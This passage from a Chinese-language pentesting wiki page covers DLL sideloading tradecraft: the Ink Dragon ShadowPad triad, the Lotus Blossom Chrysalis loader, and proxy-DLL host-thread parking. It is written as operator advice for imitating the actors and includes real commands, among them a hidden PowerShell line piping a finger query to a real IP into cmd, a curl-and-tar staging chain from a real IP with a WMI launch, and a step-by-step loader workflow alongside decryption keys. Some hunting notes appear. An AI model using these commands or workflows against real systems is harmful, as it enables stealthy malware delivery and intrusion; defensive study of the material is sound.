Check Point 描述了 Ink Dragon 如何使用一个 **three-file triad** 来伪装成合法软件，同时让核心 payload 在磁盘上保持加密状态：

1. **Signed host EXE** – 滥用 AMD、Realtek 或 NVIDIA 等厂商的程序（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者会把 executable 重命名成看起来像 Windows binary 的名字（例如 `conhost.exe`），但 Authenticode signature 仍然有效。
2. **Malicious loader DLL** – 以预期名称放在 EXE 旁边（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是一个经过 ScatterBrain framework 混淆的 MFC binary；它唯一的任务是定位加密 blob、解密它，并 reflective map ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 的形式存放在同一目录中。对解密后的 payload 进行 memory-mapping 后，loader 会删除 TMP 文件以销毁取证痕迹。

Tradecraft notes:

* 重命名 signed EXE（同时在 PE header 中保留原始 `OriginalFileName`）可以让它伪装成 Windows binary，同时保留 vendor signature，因此可以模仿 Ink Dragon 的做法，投放看起来像 `conhost.exe`、实际上却是 AMD/NVIDIA utility 的 binary。
* 由于 executable 仍然是 trusted，绝大多数 allowlisting 控制只需要你的 malicious DLL 与其并排放置即可。重点放在定制 loader DLL 上；signed parent 通常可以原样运行。
* ShadowPad 的 decryptor 期望 TMP blob 位于 loader 旁边，并且可写，这样它才能在 mapping 后把文件清零。保持目录可写直到 payload 加载完成；一旦进入内存，TMP 文件就可以安全删除，以满足 OPSEC。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

攻击者会把 DLL sideloading 与 LOLBAS 结合起来，这样磁盘上唯一的自定义 artifact 就是位于 trusted EXE 旁边的 malicious DLL：

- **Remote command loader (Finger):** Hidden PowerShell 启动 `cmd.exe /c`，从 Finger server 拉取命令并将其管道传给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 拉取 TCP/79 text；`| cmd` 执行服务器返回内容，使攻击者能够在 server-side 轮换 second stage。

- **Built-in download/extract:** 下载一个带 benign extension 的 archive，解包它，并在随机的 `%LocalAppData%` folder 下准备 sideload target 和 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 隐藏进度并跟随重定向；`tar -xf` 使用 Windows 内置 tar。

- **WMI/CIM launch:** 通过 WMI 启动 EXE，这样 telemetry 会显示一个由 CIM 创建的 process，同时它会加载同目录 DLL：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好 local DLL 的 binary（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）会在 trusted name 下运行。

- **Hunting:** 当 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 时进行告警；除 admin scripts 外，这种组合并不常见。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

近期一次 Lotus Blossom intrusion 滥用了可信 update chain，投递了一个 NSIS-packed dropper，它部署了 DLL sideload 以及完全驻留内存的 payload。

Tradecraft flow
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放重命名后的 Bitdefender Submission Wizard `BluetoothService.exe`、一个 malicious `log.dll`，以及一个加密 blob `BluetoothService`，然后启动 EXE。
- Host EXE import `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 以 mmap 方式加载 blob；`LogWrite` 使用自定义的基于 LCG 的 stream 进行解密（常量 **0x19660D** / **0x3C6EF35F**，key material 来源于之前的 hash），用 plaintext shellcode 覆盖 buffer，释放临时对象，并跳转执行。
- 为了避免 IAT，loader 会通过使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193** 对 export names 进行哈希来解析 APIs，然后应用 Murmur-style avalanche（**0x85EBCA6B**），并将结果与加盐后的 target hashes 进行比较。

Main shellcode (Chrysalis)
- 通过在五个 pass 中重复 add/XOR/sub、使用 key `gQ2JR&9;` 来解密一个类似 PE 的 main module，然后动态加载 `Kernel32.dll` → `GetProcAddress` 来完成 import resolution。
- 运行时通过逐字符 bit-rotate/XOR transforms 重建 DLL name strings，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个 resolver，遍历 **PEB → InMemoryOrderModuleList**，以 4-byte blocks 解析每个 export table，并使用 Murmur-style mixing；只有在 hash 找不到时才回退到 `GetProcAddress`。

Embedded configuration & C2
- 配置位于投放的 `BluetoothService` 文件内部，偏移为 **0x30808**（大小 **0x980**），并使用 key `qwhvb^435h&*7` 进行 RC4 解密，得到 C2 URL 和 User-Agent。
- beacon 会构建一个以点分隔的 host profile，前置 tag `4Q`，然后使用 key `vAuig34%^325hGV` 进行 RC4 加密，再通过 HTTPS 发送 `HttpSendRequestA`。响应会被 RC4 解密，并由一个 tag switch 分发（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）。
- 执行模式由 CLI args 控制：无参数 = 安装 persistence（service/Run key）指向 `-i`；`-i` 重新启动自身并带上 `-k`；`-k` 跳过安装并运行 payload。

Alternate loader observed
- 同一次 intrusion 还投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 中执行 `svchost.exe -nostdlib -run conf.c`，其旁边放置 `libtcc.dll`。攻击者提供的 C source 内嵌 shellcode，编译后在内存中运行，整个过程没有把 PE 写到磁盘上。可按如下方式复现：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 这个基于 TCC 的 compile-and-run 阶段在运行时导入了 `Wininet.dll`，并从一个硬编码 URL 拉取第二阶段 shellcode，提供了一个伪装成 compiler run 的灵活 loader。

## 通过 export proxying + host thread parking 的 Signed-host sideloading

一些 DLL sideloading 链会加入**稳定性工程**，让合法 host 在加载后续阶段时能保持足够长的存活时间并正常工作，而不是在恶意 DLL 加载后崩溃。

观察到的模式
- 将一个可信的 EXE 和一个恶意 DLL 放在一起，并使用期望的依赖名，例如 `version.dll`。
- 恶意 DLL 将所有预期的 export **proxy** 回真实的系统 DLL（例如 `%SystemRoot%\\System32\\version.dll`），这样 import resolution 仍然成功，host 进程也能继续工作。
- 加载后，恶意 DLL **patch host entry point**，使主线程进入无限 `Sleep` 循环，而不是退出或执行会终止进程的代码路径。
- 一个新线程执行真正的恶意工作：解密下一阶段 DLL 的名称或路径（RC4/XOR 很常见），然后用 `LoadLibrary` 启动它。

为什么这很重要
- 普通的 DLL proxying 只能保持 API 兼容性，但不能保证 host 会存活足够长时间以便后续阶段执行。
- 将主线程停在 `Sleep(INFINITE)` 是一种简单方法，可以在 loader 于工作线程中执行解密、staging 或网络 bootstrap 时，让已签名进程继续驻留。
- 只盯着可疑的 `DllMain` 进行 hunting 可能会漏掉这种模式，因为有趣的行为发生在 host entry point 被 patch 之后，并且第二线程启动时。

最小工作流
1. 复制已签名的 host EXE，并确定它会从本地目录解析哪个 DLL。
2. 构建一个 proxy DLL，导出相同函数并将它们转发到合法 DLL。
3. 在 `DllMain(DLL_PROCESS_ATTACH)` 中创建一个 worker thread。
4. 从该线程中 patch host entry point 或 main thread start routine，使其循环执行 `Sleep`。
5. 解密下一阶段 DLL 的名称/config，并调用 `LoadLibrary` 或手动映射 payload。

防御侧切入点
- 已签名进程从其自己的 application directory 而不是 `System32` 加载 `version.dll` 或类似常见库。
- 在 image load 后不久，进程 entry point 附近出现内存 patch，尤其是跳转/调用被重定向到 `Sleep`/`SleepEx`。
- 由 proxy DLL 创建的线程立即对第二个 DLL 调用 `LoadLibrary`，而该 DLL 具有解密后的名称。
- 放在 vendor executable 旁边的 full-export proxy DLL 位于可写 staging 目录中，例如 `ProgramData`、`%TEMP%` 或解包后的 archive path。

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
